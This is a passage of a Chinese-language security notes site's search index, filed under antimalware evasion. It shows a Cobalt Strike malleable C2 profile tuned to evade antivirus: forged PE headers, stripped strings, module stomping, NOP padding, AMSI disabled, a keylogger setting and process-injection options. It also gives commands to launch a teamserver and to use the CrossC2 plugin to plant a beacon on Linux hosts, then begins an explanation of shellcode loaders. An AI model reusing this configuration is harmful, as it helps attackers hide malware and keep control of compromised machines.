C(e){var t=!!e&amp;&amp;\\\"length\\\"in e&amp;&amp;e.length,n=x(e);return!g(e)&amp;&amp;!y(e)&amp;&amp;(\\\"array\\\"===n||0===t||\\\"number\\\"==typeof t&amp;&amp;t&gt;0&amp;&amp;t-1 in e)}var E=function(e){var t,n,r,i,o,a,s,u,l,c,f,p,d,h,g,y,v,m,x,b=\\\"sizzle\\\"+1*new Date,w=e.document,T=0,C=0,E=ae(),k=ae(),S=ae(),D=function(e,t){return e===t&amp;&amp;(f=!0),0},N={}.hasOwnProperty,A=[],j=A.pop,q=A.push,L=A.push,H=A.slice,O=function(e,t){for(var n=0,r=e.length;n&lt;r;n++)if(e[n]===t)return n;return-1},P=\\\"\\r\";\n            # 1st Line\n            prepend \"/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */\";\n            append \"\\\".(o=t.documentElement,Math.max(t.body[\\\"scroll\\\"+e],o[\\\"scroll\\\"+e],t.body[\\\"offset\\\"+e],o[\\\"offset\\\"+e],o[\\\"client\\\"+e])):void 0===i?w.css(t,n,s):w.style(t,n,i,s)},t,a?i:void 0,a)}})}),w.each(\\\"blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu\\\".split(\\\" \\\"),function(e,t){w.fn[t]=function(e,n){return arguments.length&gt;0?this.on(t,null,e,n):this.trigger(t)}}),w.fn.extend({hover:function(e,t){return this.mouseenter(e).mouseleave(t||e)}}),w.fn.extend({bind:function(e,t,n){return this.on(e,null,t,n)},unbind:function(e,t){return this.off(e,null,t)},delegate:function(e,t,n,r){return this.on(t,e,n,r)},undelegate:function(e,t,n){return 1===arguments.length?this.off(e,\\\"**\\\"):this.off(t,e||\\\"**\\\",n)}}),w.proxy=function(e,t){var n,r,i;if(\\\"string\\\"==typeof t&amp;&amp;(n=e[t],t=e,e=n),g(e))return r=o.call(arguments,2),i=function(){return e.apply(t||this,r.concat(o.call(arguments)))},i.guid=e.guid=e.guid||w.guid++,i},w.holdReady=function(e){e?w.readyWait++:w.ready(!0)},w.isArray=Array.isArray,w.parseJSON=JSON.parse,w.nodeName=N,w.isFunction=g,w.isWindow=y,w.camelCase=G,w.type=x,w.now=Date.now,w.isNumeric=function(e){var t=w.type(e);return(\\\"number\\\"===t||\\\"string\\\"===t)&amp;&amp;!isNaN(e-parseFloat(e))},\\\"function\\\"==typeof define&amp;&amp;define.amd&amp;&amp;define(\\\"jquery\\\",[],function(){return w});var Jt=e.jQuery,Kt=e.$;return w.noConflict=function(t){return e.$===w&amp;&amp;(e.$=Kt),t&amp;&amp;e.jQuery===w&amp;&amp;(e.jQuery=Jt),w},t||(e.jQuery=e.$=w),w});\";\n            print;\n        }\n    }\n}\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article2/index.html#stage-beaconcobalt-strikecs","title":"stage, \u7528\u4e8e\u81ea\u5b9a\u4e49Beacon\uff08Cobalt Strike\u7684\u6076\u610f\u8f6f\u4ef6\u7ec4\u4ef6\uff09\u5728\u5185\u5b58\u4e2d\u7684\u52a0\u8f7d\u65b9\u5f0f\u548c\u8868\u73b0\u5f62\u5f0f,\u4e5f\u5c31\u662f\u7528\u6765\u81ea\u5b9a\u4e49\u4f2a\u88c5cs\u81ea\u5e26\u7684\u90a3\u4e9b\u547d\u4ee4\u662f\u5982\u4f55\u5728\u5185\u5b58\u4e2d\u8868\u73b0\u7684","text":"<pre><code>stage {\n    # CS 4.2 added allocator and MZ header overrides\n    set allocator      \"VirtualAlloc\"; # allocator\u7528\u4e8e\u8bbe\u7f6eBeacon\u7684\u53cd\u5c04\u52a0\u8f7d\u5668\uff08Reflective Loader\uff09,\u5982\u4f55\u4e3a\u4ee3\u7406\uff08agent\uff09\u5206\u914d\u5185\u5b58  Options are: HeapAlloc, MapViewOfFile, and VirtualAlloc\n    #set magic_mz_x86   \"MZRE\";\n    #set magic_mz_x64   \"MZAR\";\n    set magic_pe       \"NO\";  # \u4e0d\u8986\u76d6Beacon\u7684\u53cd\u5c04\u52a0\u8f7d\u5668\u4f7f\u7528\u7684PE\u6587\u4ef6\n    set userwx         \"false\";   # \u4e0d\u8981\u6c42\u53cd\u5c04\u52a0\u8f7d\u5668\u5728\u5185\u5b58\u4e2d\u7684\u6743\u9650\n    set stomppe        \"true\";  # \u8981\u6c42\u53cd\u5c04\u52a0\u8f7d\u5668\u5728\u52a0\u8f7dBeacon\u6709\u6548\u8f7d\u8377\u540e\u8986\u76d6MZ\uff08Microsoft Windows Portable Executable File\uff09\u5934\u3001PE\u5934\u548ce_lfanew\u503c\u3002\n    set obfuscate      \"true\";  # obfuscate\u542f\u7528\u5bf9\u53cd\u5c04DLL\u7684\u5bfc\u5165\u8868\u8fdb\u884c\u6df7\u6dc6\uff0c\u8986\u76d6\u672a\u4f7f\u7528\u7684\u5934\u90e8\u5185\u5bb9\uff0c\u5e76\u8981\u6c42\u53cd\u5c04\u52a0\u8f7d\u5668\u5728\u6ca1\u6709DLL\u5934\u7684\u60c5\u51b5\u4e0b\u5c06Beacon\u590d\u5236\u5230\u65b0\u5185\u5b58\u4e2d\n    set cleanup        \"true\";  # cleanup\u8981\u6c42Beacon\u5c1d\u8bd5\u91ca\u653e\u4e0e\u53cd\u5c04DLL\u5305\u76f8\u5173\u8054\u7684\u5185\u5b58\u3002\n    # CS 3.12 Addition \"Obfuscate and Sleep\"\n    set sleep_mask     \"true\";  # \u542f\u7528\u5728Beacon\uff08HTTP\u3001SMB\u3001TCP Beacons\uff09\u5728\u5185\u5b58\u4e2d\u7761\u7720\u6216\u7b49\u5f85\u65b0\u8fde\u63a5/\u6570\u636e\u4e4b\u524d\u5bf9\u5176\u8fdb\u884c\u6df7\u6dc6\u7684\u529f\u80fd\n    # CS 4.1  \n    set smartinject    \"true\";  # \u542f\u7528\u4f7f\u7528\u5d4c\u5165\u5f0f\u51fd\u6570\u6307\u9488\u63d0\u793a\u6765\u5f15\u5bfcBeacon\u4ee3\u7406\n\n    # Make the Beacon Reflective DLL look like something else in memory\n    # Values captured using peclone agaist a Windows 10 version of explorer.exe\n    set checksum       \"0\";  # \u8bbe\u7f6eBeacon\u7684PE\u5934\u90e8\u4e2d\u7684\u6821\u9a8c\u548c\u503c\u3002\n    set compile_time   \"11 Nov 2016 04:08:32\";  # \u8bbe\u7f6eBeacon\u7684PE\u5934\u90e8\u4e2d\u7684\u7f16\u8bd1\u65f6\u95f4\n    set entry_point    \"650688\";  # \u8bbe\u7f6eBeacon\u7684PE\u5934\u90e8\u4e2d\u7684\u5165\u53e3\u70b9\u503c\u3002\n    set image_size_x86 \"4661248\";\n    set image_size_x64 \"4661248\";\n    set name           \"srv.dll\";\n    set rich_header    \"\\x75\\x92\\x8d\\x57\\x7e\\xda\\xcd\\x57\\xf8\\x85\\x35\\xab\\x72\\x6a\\x6e\\xee\\xa2\\x86\\x29\\x6c\";\n\n    ## WARNING: Module stomping \n    # Cobalt Strike 3.11 also adds module stomping to Beacon's Reflective Loader. When enabled, Beacon's loader will shun VirtualAlloc and instead load a DLL into the current process and overwrite its memory.\n    # Set module_x86 to a favorite x86 DLL to module stomp with the x86 Beacon. The module_x64 option enables this for the x64 Beacon.\n    # While this is a powerful feature, caveats apply! If the library you load is not large enough to host Beacon, you will crash Beacon's process. If the current process loads the same library later (for whatever reason), you will crash Beacon's process. Choose carefully.\n    # By default, Beacon's loader allocates memory with VirtualAlloc. Module stomping is an alternative to this. Set module_x86 to a DLL that is about twice as large as the Beacon payload itself. Beacon's x86 loader will load the specified DLL, find its location in memory, and overwrite it. This is a way to situate Beacon in memory that Windows associates with a file on disk. It's important that the DLL you choose is not needed by the applications you intend to reside in. The module_x64 option is the same story, but it affects the x64 Beacon.\n    # Details can be found in the In-memory Evasion video series. https://youtu.be/uWVH9l2GMw4\n\n    # set module_x64 \"netshell.dll\";\n    # set module_x86 \"netshell.dll\";\n\n    # The transform-x86 and transform-x64 blocks pad and transform Beacon's Reflective DLL stage. These blocks support three commands: prepend, append, and strrep.\n    transform-x86 { # transform the x86 rDLL stage\n        prepend \"\\x87\\xdb\\x66\\x87\\xd2\\x49\\x66\\x90\\x87\\xd2\\x0f\\x1f\\x00\\x87\\xc9\\x41\\x66\\x87\\xc9\\x42\\x44\\x0f\\x1f\\x00\\x40\\x40\\x66\\x87\\xdb\\x0f\\x1f\\x04\\x00\\x48\\x46\\x4c\\x90\\x45\\x43\\x47\\x66\\x0f\\x1f\\x04\\x00\\x0f\\x1f\\x00\"; # prepend nops\n        strrep \"ReflectiveLoader\" \"execute\"; # Change this text\n        strrep \"This program cannot be run in DOS mode\" \"\"; # Remove this text\n        strrep \"beacon.dll\" \"\"; # Remove this text\n    }\n    transform-x64 { # transform the x64 rDLL stage\n        prepend \"\\x87\\xdb\\x66\\x87\\xd2\\x49\\x66\\x90\\x87\\xd2\\x0f\\x1f\\x00\\x87\\xc9\\x41\\x66\\x87\\xc9\\x42\\x44\\x0f\\x1f\\x00\\x40\\x40\\x66\\x87\\xdb\\x0f\\x1f\\x04\\x00\\x48\\x46\\x4c\\x90\\x45\\x43\\x47\\x66\\x0f\\x1f\\x04\\x00\\x0f\\x1f\\x00\"; # prepend nops\n        strrep \"ReflectiveLoader\" \"execute\"; # Change this text in the Beacon DLL\n        strrep \"beacon.x64.dll\" \"\"; # Remove this text in the Beacon DLL\n    }\n\n    stringw \"jQuery\"; # Add this string to the DLL\n}\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article2/index.html#post-ex","title":"post-ex \u540e\u6e17\u900f\u76f8\u5173","text":"<pre><code>post-ex {\n        # \u6307\u5b9a\u4e8632\u4f4dBeacon\u5728\u6267\u884c\u540e\u6e17\u900f\uff08post-exploitation\uff09\u4efb\u52a1\u65f6\u6ce8\u5165shellcode\u7684\u76ee\u6807\u7a0b\u5e8f\u8def\u5f84\n        set spawnto_x86 \"%windir%\\\\syswow64\\\\WerFault.exe\";\n        set spawnto_x64 \"%windir%\\\\sysnative\\\\WerFault.exe\";\n        # \u542f\u7528\u5bf9\u540e\u6e17\u900fDLL\u7684\u6df7\u6dc6\n        set obfuscate \"true\";\n        # \u542f\u7528\u667a\u80fd\u6ce8\u5165\u529f\u80fd\n        set smartinject \"true\";\n        # \u7981\u7528AMSI\n        set amsi_disable \"true\";\n        # \u5b9a\u4e49\u4e86\u7528\u4e8e\u540e\u6e17\u900f\u4efb\u52a1\u7684\u547d\u540d\u7ba1\u9053\u540d\u79f0\u3002\n        set pipename \"Winsock2\\\\CatalogChangeListener-###-0,\";\n        # \u8bbe\u7f6e\u952e\u76d8\u8bb0\u5f55\u4f7f\u7528\u7684\u51fd\u6570\n        set keylogger \"GetAsyncKeyState\";\n}\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article2/index.html#process-inject","title":"process-inject \u8fdb\u7a0b\u6ce8\u5165\u81ea\u5b9a\u4e49\u7684\u53c2\u6570","text":"<pre><code>process-inject {\n    set allocator \"NtMapViewOfSection\";  # \u8bbe\u7f6e\u8fdc\u7a0b\u8fdb\u7a0b\u4e2d\u5185\u5b58\u5206\u914d\u7684\u65b9\u6cd5\u4e3a NtMapViewOfSection\n    set min_alloc \"17500\";  # \u6ce8\u5165\u5185\u5bb9\u7684\u6700\u5c0f\u5185\u5b58\u5206\u914d\u5927\u5c0f\n\n    # Set memory permissions as permissions as initial=RWX, final=RX\n    set startrwx \"false\";  # \u6ce8\u5165\u5185\u5bb9\u7684\u521d\u59cb\u5185\u5b58\u6743\u9650,false\u610f\u5473\u7740\u4e0d\u662f\u8bfb\u5199\u6267\u884c\n    set userwx   \"false\";   # \u6700\u7ec8\u5185\u5b58\u6743\u9650\n    transform-x86 {\n        prepend \"\\x87\\xdb\\x66\\x87\\xd2\\x49\\x66\\x90\\x87\\xd2\\x0f\\x1f\\x00\\x87\\xc9\\x41\\x66\\x87\\xc9\\x42\\x44\\x0f\\x1f\\x00\\x40\\x40\\x66\\x87\\xdb\\x0f\\x1f\\x04\\x00\\x48\\x46\\x4c\\x90\\x45\\x43\\x47\\x66\\x0f\\x1f\\x04\\x00\\x0f\\x1f\\x00\";\n        #append \"\\x90\\x90\";\n    }\n    transform-x64 {\n        prepend \"\\x87\\xdb\\x66\\x87\\xd2\\x49\\x66\\x90\\x87\\xd2\\x0f\\x1f\\x00\\x87\\xc9\\x41\\x66\\x87\\xc9\\x42\\x44\\x0f\\x1f\\x00\\x40\\x40\\x66\\x87\\xdb\\x0f\\x1f\\x04\\x00\\x48\\x46\\x4c\\x90\\x45\\x43\\x47\\x66\\x0f\\x1f\\x04\\x00\\x0f\\x1f\\x00\";\n        #append \"\\x90\\x90\";\n    }\n\n\n    execute {\n        CreateThread \"ntdll!RtlUserThreadStart+0x42\";\n        CreateThread;\n        NtQueueApcThread-s;\n        CreateRemoteThread;\n        RtlCreateUserThread; \n    }\n}\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article2/index.html#profile-opsec","title":"\u4fee\u6539profile\u6587\u4ef6, \u589e\u5f3aopsec\u7684\u6548\u679c","text":"<p>prepend.py\u662f\u4e00\u4e2a python \u811a\u672c\uff0c\u5b83\u751f\u6210\u52a8\u6001\u5783\u573e shellcode\uff0c\u8be5 shellcode \u5c06\u9644\u52a0\u5728\u5b9e\u9645 shellcode \u7684\u5f00\u5934\u3002\u8981\u4f7f\u7528\u8be5\u811a\u672c\uff0c\u8bf7\u6267\u884c\uff1a</p> <pre><code>python3 prepend.py\n</code></pre> <p>\u590d\u5236\u8f93\u51fa\u5e76\u5c06\u5176\u7c98\u8d34\u5230\u914d\u7f6e\u6587\u4ef6\u4e2d\uff08\u5728 transform-x64 \u6216 transform-x86 \u5757\u5185\uff09\u3002\u914d\u7f6e\u6587\u4ef6\u5c06\u5982\u4e0b\u6240\u793a\uff1a</p> <pre><code> transform-x64 {\nprepend \n\"\\x44\\x40\\x4B\\x43\\x4C\\x48\\x90\\x66\\x90\\x0F\\x1F\\x00\\x66\\x0F\\x1F\\x04\\x00\\x0F\\x1F\\x04\\x00\\x0F\\x1F\\x00\\x0F\\x1F\\x00\";\n#append \"\\x90\\x90\";\n    }\n</code></pre> <p>rich_header.py\u662f\u4e00\u4e2a python \u811a\u672c\uff0c\u5b83\u751f\u6210\u52a8\u6001 shellcode\uff0c\u8d1f\u8d23\u7f16\u8bd1\u5668\u63d2\u5165\u7684\u5143\u4fe1\u606f\u3002Rich \u6807\u5934\u662f\u4e00\u4e2a PE \u90e8\u5206\uff0c\u7528\u4f5c Windows \u53ef\u6267\u884c\u6587\u4ef6\u751f\u6210\u73af\u5883\u7684\u6307\u7eb9\u3002\u8981\u4f7f\u7528\u8be5\u811a\u672c\uff0c\u8bf7\u6267\u884c\uff1a</p> <pre><code>python3 rich_header.py\n</code></pre> <p>\u590d\u5236\u8f93\u51fa\u5e76\u5c06\u5176\u7c98\u8d34\u5230\u914d\u7f6e\u6587\u4ef6\u4e2d\u3002\u914d\u7f6e\u6587\u4ef6\u5c06\u5982\u4e0b\u6240\u793a\uff1a</p> <pre><code>stage {\n  ...\n  set rich_header \"\\x2e\\x9a\\xad\\xf1...\";\n  ...\n}\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article2/index.html#34profile","title":"3.4\u68c0\u67e5profile\u6587\u4ef6","text":"<p>\u6d4b\u8bd5\u662f\u5426\u53ef\u7528</p> <pre><code>chmod+x c2lint\n./c2lint [/path/to/my.profile] # \u5982 ./c2lint bing_jx.profile\n\n# \u8fdb\u884c\u5404\u79cd\u534f\u8bae \u5982 smb , http , https\u7684\u8bf7\u6c42\u6a21\u62df , \u5224\u65ad\u662f\u5426\u53ef\u7528 , \u8bf7\u6c42\u7ed3\u675f\u4e0b\u9762\u4f1a\u6709\u7ed3\u679c\u8f93\u51fa (\u9ec4\u8272\u8b66\u544a,\u7ea2\u8272\u8bed\u6cd5\u9519\u8bef)\n</code></pre> <p></p> <p>\u4f7f\u7528profile\u6587\u4ef6 , \u542f\u52a8cs</p> <pre><code>./teamserver 192.168.101.48 123456 jquery-c2.4.5-jx.profile\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article2/index.html#4cslinux","title":"4.CS\u914d\u7f6elinux\u4e0a\u7ebf","text":""},{"location":"CTF/Antimalware_evasion/AV/Article2/index.html#41-crossc2","title":"4.1\u4e0b\u8f7d CrossC2","text":"<p>cs\u9ed8\u8ba4\u662f\u4e0d\u652f\u6301\u4e0a\u7ebflinux\u4e3b\u673a\u7684 , \u4f46\u662f\u53ef\u4ee5\u901a\u8fc7\u5b89\u88c5CrossC2\u63d2\u4ef6\u5b9e\u73b0 </p> <p>\u56e0\u4e3a\u4e00\u4e9b\u539f\u56e0\uff0c\u76ee\u524d\u5f3a\u5236\u53ea\u652f\u6301HTTPS beacon\u3002</p> <p>\u4e0b\u8f7d\u5730\u5740 </p> <pre><code>https://github.com/gloxec/CrossC2/releases\n</code></pre> <p></p> <p>\u7136\u540e\u89e3\u538bzip\u538b\u7f29\u5305 , \u8fd9\u91cc\u6211\u653e\u5230cs\u5b89\u88c5\u76ee\u5f55\u7684 script\u76ee\u5f55 \u4e0b , \u63a8\u8350\u8fd9\u4e2a\u76ee\u5f55</p> <p></p>"},{"location":"CTF/Antimalware_evasion/AV/Article2/index.html#42","title":"4.2\u5b89\u88c5\u63d2\u4ef6","text":"<p>\u9996\u5148\u7f16\u8f91CrossC2-GithubBot-2021-11-02.cna\u6587\u4ef6</p> <p></p> <p>\u590d\u5236cs\u670d\u52a1\u7aef\u76ee\u5f55\u4e0b\u7684 .cobaltstrike.beacon_keys \u5230\u4e0e genCrossC2.Win.exe \u5728\u4e00\u4e2a\u76ee\u5f55\u4e0b</p> <p></p> <p>\u542f\u52a8cs , \u4f7f\u7528\u5ba2\u6237\u7aef\u52a0\u8f7dcna\u63d2\u4ef6 \uff0c\u9009\u62e9Script Manager\uff0c\u6dfb\u52a0CrossC2.cna (\u5982\u679c\u6210\u529f\u5b89\u88c5\uff0c\u83dc\u5355\u680f\u4f1a\u591a\u51fa\u4e00\u9879 CrossC2)</p> <p></p> <p>\u70b9\u51fb\u52a0\u8f7d , \u9009\u62e9 CrossC2-GithubBot-2021-11-02.cna \u6587\u4ef6</p>"},{"location":"CTF/Antimalware_evasion/AV/Article2/index.html#43","title":"4.3\u4e0a\u7ebf\u6d4b\u8bd5","text":"<p>\u9996\u5148\u65b0\u5efa\u4e00\u4e2ahttps\u7684\u76d1\u542c</p> <p></p> <p></p> <p></p>"},{"location":"CTF/Antimalware_evasion/AV/Article2/index.html#44","title":"4.4\u6267\u884c\u6728\u9a6c\u4e0a\u7ebf","text":"<p>\u751f\u6210\u7684\u6728\u9a6c\u5728\u5ba2\u6237\u7aef\u5f53\u524d\u76ee\u5f55\u4e0b</p> <p></p> <p>\u4e0a\u4f20\u5230linux\u673a\u5668, \u6267\u884c</p> <pre><code>chmod +x t_cc2.out \n./t_cc2.out\n# \u540e\u53f0\u8fd0\u884c\nnohup ./t_cc2.out &amp;\n</code></pre> <p>\u4e0a\u7ebf\u6210\u529f</p>"},{"location":"CTF/Antimalware_evasion/AV/Article2/index.html#5cobaltstrike-cat-45","title":"5.CobaltStrike-[Cat]-4.5","text":"<p>\u5ba2\u6237\u7aef\u767b\u5f55\uff1a</p> <pre><code>C:\\Users\\86178\\Desktop\\Tools\\cat_cs4.5_5.1_client\\jdk-11.0.15.1\\bin\\java.exe  -jar cat_client.jar client\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article3/index.html","title":"1.shellcode","text":""},{"location":"CTF/Antimalware_evasion/AV/Article3/index.html#11shellcode","title":"1.1\u4ec0\u4e48\u662fshellcode","text":"<p>ShelLcode\u662f\u4e00\u79cd\u7279\u6b8a\u7684\u4e8c\u8fdb\u5236\u4ee3\u7801, \u4e3b\u8981\u76ee\u7684\u662f\u5728\u76ee\u6807\u7cfb\u7edf\u4e0a\u6267\u884c\u7279\u5b9a\u7684\u64cd\u4f5c\uff0c\u4f8b\u5982\u83b7\u53d6\u7cfb\u7edf\u6743\u9650\u3001\u5efa\u7acb\u8fdc\u7a0b\u8bbf\u95ee\u901a\u9053\u3001\u6267\u884c\u6076\u610f\u4ee3\u7801\u7b49\u3002Shellcode \u7684\u540d\u79f0\u6765\u6e90\u4e8e\u5176\u6700\u5e38\u89c1\u7684\u7528\u9014\u4e4b\u4e00\uff0c\u5373\u5728\u6210\u529f\u5229\u7528\u540e\u6ce8\u5165\u4ee3\u7801\u6765\u83b7\u53d6\u7cfb\u7edf shell \u7684\u63a7\u5236\u6743\u3002</p>"},{"location":"CTF/Antimalware_evasion/AV/Article3/index.html#12shellcode","title":"1.2shellcode\u6587\u4ef6","text":"<p>shellcode\u6587\u4ef6\u901a\u5e38\u662f\u4e00\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002Shellcode \u662f\u4e00\u7ec4\u7528\u4e8e\u6267\u884c\u7279\u5b9a\u4efb\u52a1\u7684\u673a\u5668\u7801\u6307\u4ee4\uff0c\u5b83\u4eec\u88ab\u8bbe\u8ba1\u6210\u7d27\u51d1\u4e14\u76f4\u63a5\u6267\u884c\u6240\u9700\u64cd\u4f5c\u7684\u4e8c\u8fdb\u5236\u8868\u793a\u5f62\u5f0f\u3002\u8fd9\u4e9b\u6307\u4ee4\u88ab\u7528\u4e8e\u5229\u7528\u6f0f\u6d1e\u3001\u6267\u884c\u7279\u5b9a\u7684\u6076\u610f\u529f\u80fd\u6216\u4e0e\u8fdc\u7a0b\u547d\u4ee4\u4e0e\u63a7\u5236\uff08C2\uff09\u670d\u52a1\u5668\u5efa\u7acb\u8fde\u63a5\u7b49\u3002</p> <pre><code>exe\u6587\u4ef6 --&gt; \u786c\u76d8 --&gt; \u628aexe\u5185\u5bb9,\u8bfb\u53d6\u5230\u5185\u5b58\u4e2d --&gt; \u8f6c\u6210\u4e8c\u8fdb\u5236\u6307\u4ee4 --&gt; cpu\u8fd0\u884c\n</code></pre> <p>Shellcode \u901a\u5e38\u4ee5\u4e8c\u8fdb\u5236\u683c\u5f0f\u5b58\u50a8\uff0c\u56e0\u4e3a\u5b83\u9700\u8981\u76f4\u63a5\u7531\u8ba1\u7b97\u673a\u7684\u4e2d\u592e\u5904\u7406\u5355\u5143\uff08CPU\uff09\u6267\u884c\u3002\u8fd9\u4e0e\u6e90\u4ee3\u7801\u6216\u6587\u672c\u6587\u4ef6\u4e0d\u540c\uff0c\u8fd9\u4e9b\u6587\u4ef6\u9700\u8981\u7f16\u8bd1\u6216\u89e3\u91ca\u6210\u673a\u5668\u7801\u624d\u80fd\u6267\u884c\u3002</p> <p>\u5728\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c shellcode \u53ef\u80fd\u4ee5\u5341\u516d\u8fdb\u5236\u5b57\u7b26\u4e32\u7684\u5f62\u5f0f\u51fa\u73b0 \uff0c\u4f46\u5728\u8fd0\u884c\u65f6\uff0c\u8fd9\u4e9b\u5b57\u7b26\u4e32\u901a\u5e38\u4f1a\u88ab\u89e3\u6790\u4e3a\u4e8c\u8fdb\u5236\u6570\u636e\u3002\u8981\u4f7f\u7528 shellcode\uff0c\u901a\u5e38\u9700\u8981\u5c06\u5b83\u5d4c\u5165\u5230\u5408\u9002\u7684\u8f7d\u4f53\u4e2d\u6216\u4ee5\u5176\u4ed6\u65b9\u5f0f\u5c06\u5176\u4f20\u9012\u7ed9\u76ee\u6807\u7cfb\u7edf\uff0c\u4ee5\u4fbf\u6267\u884c\u5176\u4e2d\u7684\u6307\u4ee4\u3002</p>"},{"location":"CTF/Antimalware_evasion/AV/Article3/index.html#13shellcode","title":"1.3\u4e3a\u4ec0\u4e48\u6709shellcode","text":"<p>\u5982\u679c\u53ea\u662f\u9488\u5bf9\u514d\u6740\u800c\u8a00, shellcode\u7684\u51fa\u73b0\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u8fdb\u884c\u5404\u79cd\u4e0d\u540c\u65b9\u5f0f\u4e0a\u7ebfcs, \u4ece\u800c\u89e3\u51b3\u4e86\u53ea\u6709exe\u4e0a\u7ebf\u505a\u514d\u6740\u7684\u90a3\u51e0\u79cd\u53d7\u9650\u7684\u65b9\u6cd5, \u63d0\u4f9b\u66f4\u591a\u4e0d\u540c\u7684\u514d\u6740\u5904\u7406\u65b9\u5f0f\u3002</p>"},{"location":"CTF/Antimalware_evasion/AV/Article3/index.html#14shellcode","title":"1.4shellcode\u5982\u4f55\u8fd0\u884c","text":"<p>\u4e0a\u9762\u6211\u4eec\u4e86\u89e3\u5230, \u4e00\u822c\u60c5\u51b5\u4e0b\u6211\u4eec\u62ff\u5230\u7684 shellcode, \u8981\u4e48\u662f\u4e00\u4e2a16\u8fdb\u5236\u5b57\u7b26\u4e32, \u8981\u4e48\u662f\u4e00\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6, \u4ed6\u4eec\u90fd\u662f\u4e0d\u80fd\u5355\u72ec\u76f4\u63a5\u53ef\u4ee5\u8fd0\u884c\u7684\u6587\u4ef6, \u6240\u4ee5\u6211\u4eec\u9700\u8981\u501f\u52a9\u52a0\u8f7d\u5668\u5b9e\u73b0shellcode\u5728\u76ee\u6807\u673a\u5668\u4e2d\u8fd0\u884c\u3002</p> <p>\u4f7f\u7528\u52a0\u8f7d\u5668\u8fd0\u884cshellcode</p>"},{"location":"CTF/Antimalware_evasion/AV/Article3/index.html#2csshellcode","title":"2.cs\u7684shellcode","text":"<p>\u4e8c\u8fdb\u5236\u6587\u4ef6\u5f62\u5f0f\u7684shellcode\u5728cs\u4e2d\u662fraw\u683c\u5f0f\u6587\u4ef6, \"raw\" \u683c\u5f0f\u6587\u4ef6\u53ef\u80fd\u6ca1\u6709\u7ecf\u8fc7\u4efb\u4f55\u538b\u7f29\u3001\u7f16\u7801\u6216\u52a0\u5bc6\u3002\u8fd9\u79cd\u6587\u4ef6\u683c\u5f0f\u901a\u5e38\u5305\u542b\u539f\u59cb\u7684\u4e8c\u8fdb\u5236\u6570\u636e\uff0c\u800c\u4e0d\u662f\u7ecf\u8fc7\u683c\u5f0f\u5316\u7684\u6587\u672c\u6570\u636e\u3002</p> <p></p> <p></p> <p></p> <p>\u91cc\u9762\u7684\u5185\u5bb9\u5168\u662f\u4e8c\u8fdb\u5236, \u975e\u6587\u672c</p> <p>16\u8fdb\u5236\u683c\u5f0f\u7684\u5b57\u7b26\u4e32\u5bf9\u5e94\u7684shellcode\u751f\u6210</p> <p></p> <p></p> <p>\u8fd9\u4e2a\u5c31\u662fc\u8bed\u8a00\u4e2d, \u5b9a\u4e49shellcode\u7684\u4ee3\u7801, \u5176\u4e2d</p> <p>unsigned char : \u8fd9\u8868\u793a buf \u6570\u7ec4\u7684\u5143\u7d20\u7c7b\u578b\u662f\u65e0\u7b26\u53f7\u5b57\u7b26\uff088\u4f4d\uff09</p> <p>buf[] : \u8fd9\u662f\u5b57\u7b26\u6570\u7ec4\u7684\u58f0\u660e\uff0c\u540d\u79f0\u4e3a buf</p> <p>\"\\xfc....\" : \u8fd9\u662f\u5b57\u7b26\u4e32\u5b57\u9762\u503c, \u8fd9\u662f\u4e00\u4e2a\u5341\u516d\u8fdb\u5236\u6570</p>"},{"location":"CTF/Antimalware_evasion/AV/Article3/index.html#3shellcode","title":"3.shellcode\u52a0\u8f7d\u5668","text":""},{"location":"CTF/Antimalware_evasion/AV/Article3/index.html#11shellcode_1","title":"1.1\u4ec0\u4e48\u662fshellcode\u52a0\u8f7d\u5668","text":"<p>\u7528\u4e8e\u5e2e\u52a9 shellcode\u6587\u4ef6/16\u8fdb\u5236\u5b57\u7b26\u4e32\u7684shellcode \u8fd0\u884c\u7684\u5de5\u5177, \u901a\u8fc7\u7531\u4e00\u6bb5\u4ee3\u7801\u7ec4\u6210</p>"},{"location":"CTF/Antimalware_evasion/AV/Article3/index.html#12shellcode_1","title":"1.2\u4e3a\u4ec0\u4e48\u6709shellcode\u52a0\u8f7d\u5668","text":"<p>\u5e2e\u52a9shellcode\u5728\u76ee\u6807\u7cfb\u7edf\u4e0a\u8fd0\u884c\u8d77\u6765</p>"},{"location":"CTF/Antimalware_evasion/AV/Article3/index.html#13shellcode_1","title":"1.3shellcode\u52a0\u8f7d\u5668\u5982\u4f55\u7f16\u5199","text":"<p>\u9996\u5148shellcode\u52a0\u8f7d\u5668\u65e2\u7136\u662f\u901a\u8fc7\u4ee3\u7801\u7f16\u5199, \u90a3\u4e48\u5728\u7406\u8bba\u4e0a\u4e0d\u540c\u7f16\u7a0b\u8bed\u8a00\u90fd\u53ef\u4ee5\u7f16\u5199.</p> <p>\u6574\u4e2ashellcode\u60f3\u8981\u6267\u884c, \u9700\u8981\u52a0\u8f7d\u5668\u505a\u90a3\u4e9b\u4e8b\u60c5\u5462? \u7531\u4e8eshellcode\u76f4\u63a5\u7531cpu\u6267\u884c, \u90a3\u4e48\u56de\u60f3\u4e00\u4e2a\u7a0b\u5e8f\u662f\u600e\u4e48\u8dd1\u8d77\u6765\u7684? \u9996\u5148\u7a0b\u5e8f\u8fd0\u884c\u4ea7\u751f\u7684\u6570\u636e\u4e00\u5b9a\u662f\u5728\u5185\u5b58\u4e2d, \u6570\u636e\u4ece\u5185\u5b58\u4e2d\u53d6\u51fa\u6765, \u7ffb\u8bd1\u6210\u6307\u4ee4, cpu\u6267\u884c\u8fd9\u4e9b\u6307\u4ee4</p> <p>\u6240\u4ee5\u6211\u7684\u52a0\u8f7d\u5668, \u9700\u8981\u5b9e\u73b0\u7684\u529f\u80fd\u5c31\u662f</p> <ul> <li> <p>\u5f00\u8f9f\u5185\u5b58</p> </li> <li> 